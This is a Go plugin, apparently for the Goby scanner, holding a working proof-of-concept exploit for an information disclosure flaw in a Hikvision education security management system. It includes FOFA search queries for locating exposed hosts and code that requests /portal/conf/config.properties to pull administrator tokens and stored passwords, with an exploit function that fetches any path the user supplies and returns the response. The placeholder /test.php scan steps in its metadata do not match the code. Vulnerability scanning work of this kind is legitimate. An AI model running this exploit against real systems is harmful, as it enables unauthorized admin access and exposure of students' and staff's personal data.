package exploits

import (
	"errors"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Hikvision Education Comprehensive Security Management System /portal/conf/config.properties Information Disclosure Vulnerability",
    "Description": "<p>Hikvision Education Comprehensive Security Management System has a severe security vulnerability that leads to the leakage of administrator tokens (admintoken). Attackers can access a specific URL path to obtain the administrator's token, allowing unauthorized access to the system's administrative functions.</p>",
    "Product": "Hikvision Education Comprehensive Security Management System",
    "Homepage": "https://www.hikvision.com/cn/",
    "DisclosureDate": "2024-08-15",
    "PostTime": "2024-08-15",
    "Author": "maweixuan@baimaohui.net",
    "FofaQuery": "(body=\"download/InstallRootCert.exe\" && body=\"综合安防管理平台\") || body=\"/portal/ui/static/js/login\"",
    "GobyQuery": "(body=\"download/InstallRootCert.exe\" && body=\"综合安防管理平台\") || body=\"/portal/ui/static/js/login\"",
    "Level": "2",
    "Impact": "<p>Unauthorized system access: Attackers can gain administrator privileges using the leaked token.Data breach: Sensitive information may be accessed and stolen by unauthorized individuals.System integrity compromise: Attackers might modify system configurations or implant malicious code.Privacy violation: Personal information of students and staff may be exposed.</p>",
    "Recommendation": "<p>It is recommended that users pay attention to the latest patches on the official website and regularly review and update the access control list.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "info",
            "show": ""
        },
        {
            "name": "info",
            "type": "input",
            "value": "/portal/conf/config.properties",
            "show": "mode=info"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure",
        "HW-2024"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.5",
    "Translation": {
        "CN": {
            "Name": "海康威视教育综合安防管理系统 /portal/conf/config.properties 信息泄露漏洞",
            "Product": "海康威视教育综合安防管理系统",
            "Description": "<p>海康威视教育综合安防管理系统/portal/conf/config.properties存在一个严重的安全漏洞，该漏洞导致管理员令牌泄露。攻击者可以通过特定的URL路径访问，获取管理员权限的令牌，从而未经授权访问系统的管理功能<br></p>",
            "Recommendation": "<p>建议用户关注官网最新补丁，定期审查和更新访问控制列表。</p>",
            "Impact": "<p>未经授权的系统访问：攻击者可以使用泄露的令牌获得管理员权限。数据泄露：敏感信息可能被未授权人员访问和窃取。系统完整性受损：攻击者可能修改系统配置或植入恶意代码。隐私侵犯：学生和教职工的个人信息可能被泄露<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Hikvision Education Comprehensive Security Management System /portal/conf/config.properties Information Disclosure Vulnerability",
            "Product": "Hikvision Education Comprehensive Security Management System",
            "Description": "<p>Hikvision Education Comprehensive Security Management System has a severe security vulnerability that leads to the leakage of administrator tokens (admintoken). Attackers can access a specific URL path to obtain the administrator's token, allowing unauthorized access to the system's administrative functions.<br></p>",
            "Recommendation": "<p>It is recommended that users pay attention to the latest patches on the official website and regularly review and update the access control list.<br></p>",
            "Impact": "<p>Unauthorized system access: Attackers can gain administrator privileges using the leaked token.Data breach: Sensitive information may be accessed and stolen by unauthorized individuals.System integrity compromise: Attackers might modify system configurations or implant malicious code.Privacy violation: Personal information of students and staff may be exposed.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9932"
}`

	sendInitialPayload_KzRKfL := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		uri := `/portal/conf/config.properties`
		cfg := httpclient.NewGetRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Timeout = 15

		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 200 {
			return nil, errors.New("response status code is not 200")
		}
		if !strings.Contains(resp.Utf8Html, `portalcache.1.@parent.@password`) {
			return nil, errors.New("not expected response")
		}
		return resp, nil
	}

	sendExploitPayload_OAsDXN := func(hostInfo *httpclient.FixUrl, info string) (*httpclient.HttpResponse, error) {
		uri := info
		cfg := httpclient.NewGetRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Timeout = 15

		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, err := sendInitialPayload_KzRKfL(hostInfo)
			if err != nil {
				return false
			}

			// 添加更多检查项
			if !strings.Contains(resp.Utf8Html, "@bic.serviceDirectory.ip") ||
				!strings.Contains(resp.Utf8Html, "portalcache.1.@parent.@password") {
				return false
			}

			ss.VulURL = hostInfo.FixedHostInfo + `/portal/conf/config.properties`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			info := goutils.B2S(stepLogs.Params["info"])

			resp, err := sendExploitPayload_OAsDXN(expResult.HostInfo, info)
			if err != nil {
				expResult.Output = `漏洞利用失败:` + err.Error()
				expResult.Success = false
				return expResult
			}
			if resp.StatusCode != 200 || !strings.Contains(resp.Utf8Html, `portalcache.1.@parent.@password`) {
				expResult.Output = `漏洞利用失败: 未找到预期的响应`
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp.Utf8Html
			return expResult
		},
	))
}
